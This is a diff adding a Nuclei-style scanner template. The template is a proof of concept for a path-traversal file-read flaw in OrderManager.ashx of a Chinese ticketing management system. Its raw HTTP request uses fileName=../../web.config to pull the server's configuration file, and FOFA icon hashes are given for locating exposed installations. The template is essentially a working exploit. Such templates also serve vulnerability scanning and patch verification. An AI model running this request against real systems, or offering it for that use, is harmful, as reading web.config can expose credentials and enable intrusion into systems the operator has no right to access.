@@ -1,0 +1,29 @@
+id: poc-op3yagewg373yzo3
+info:
+  name: 中成科信票务管理系统 OrderManager.ashx 存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/op3yagewg373yzo3'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: op3yagewg373yzo3
+    fofa: icon_hash="1632964065" || icon_hash="-2142050529"
+http:
+- raw:
+  - 'GET /SystemManager/OrderManager/OrderManager.ashx?Method=DownTemplate&fileName=../../web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
